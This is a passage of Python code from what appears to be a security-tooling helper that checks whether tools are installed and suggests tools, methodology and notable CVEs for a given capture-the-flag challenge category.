    registry_name = TOOL_ALIASES.get(tool_name, tool_name)

    # Check if it's in the registry
    in_registry = registry_name in tools_db.tools_by_name

    if in_registry:
        status = tools_db.check_installed(registry_name)
        if status["installed"]:
            return True, True

    # PATH check using the display name (the binary users actually run)
    if shutil.which(tool_name):
        return True, in_registry

    return False, in_registry


def suggest_for_ctf(challenge_type: str, tools_db: ToolsDatabase) -> dict:
    """Return tool suggestions for a CTF challenge type with install status.

    Returns dict with: category, description, modules, tools (with install status).
    """
    category = resolve_category(challenge_type)
    if not category:
        available = sorted(CTF_CATEGORY_MAP.keys())
        aliases = sorted(CATEGORY_ALIASES.keys())
        return {
            "error": f"Unknown challenge type: '{challenge_type}'",
            "available_categories": available,
            "available_aliases": aliases,
        }

    cat_info = CTF_CATEGORY_MAP[category]
    tools_with_status = []
    for tool_name, description in cat_info["tools"]:
        installed, in_registry = _check_tool_installed(tool_name, tools_db)
        entry = {
            "name": tool_name,
            "description": description,
            "installed": installed,
            "in_registry": in_registry,
        }
        # Add registry name if different from display name
        registry_name = TOOL_ALIASES.get(tool_name)
        if registry_name:
            entry["registry_name"] = registry_name
        tools_with_status.append(entry)

    installed_count = sum(1 for t in tools_with_status if t["installed"])

    result = {
        "category": category,
        "description": cat_info["description"],
        "modules": cat_info["modules"],
        "tools": tools_with_status,
        "methodology": cat_info.get("methodology", []),
        "quick_wins": cat_info.get("quick_wins", []),
        "summary": f"{installed_count}/{len(tools_with_status)} tools installed",
    }
    if "notable_cves" in cat_info:
        result["notable_cves"] = cat_info["notable_cves"]
    return result
